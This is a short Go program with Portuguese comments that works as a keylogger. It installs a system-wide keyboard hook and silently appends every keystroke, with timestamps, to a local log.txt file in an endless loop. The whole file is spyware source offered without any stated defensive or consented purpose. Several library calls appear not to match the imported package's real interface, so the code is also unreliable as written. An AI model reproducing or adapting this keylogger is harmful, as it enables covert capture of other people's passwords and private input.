package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/moutend/go-hook/pkg/keyboard"
)

func main() {
	// Abre o arquivo de log para escrever as entradas do usuário
	logFile, err := os.OpenFile("log.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		fmt.Println("Erro ao abrir arquivo de log:", err)
		return
	}
	defer logFile.Close()

	// Cria um logger para escrever as entradas do usuário no arquivo de log
	logger := log.New(logFile, "", log.LstdFlags)

	// Inicializa o hook de teclado
	if err := keyboard.Start(); err != nil {
		fmt.Println("Erro ao iniciar hook de teclado:", err)
		return
	}
	defer keyboard.Stop()

	// Canal para receber eventos de teclado
	ch := make(chan keyboard.KeyEvent)

	// Rotina para ler os eventos de teclado em segundo plano
	go func() {
		for {
			event := <-ch
			// Escreve a entrada do usuário no arquivo de log
			logger.Printf("Chave: %v, Ação: %v, Tecla especial: %v\n", event.Key, event.Action, event.Special)
		}
	}()

	// Adiciona o canal para receber eventos de teclado ao hook
	if err := keyboard.AddEventObserver(ch); err != nil {
		fmt.Println("Erro ao adicionar observador de eventos:", err)
		return
	}

	// Mantém a rotina principal rodando em loop infinito
	for {
		time.Sleep(1 * time.Second)
	}
}
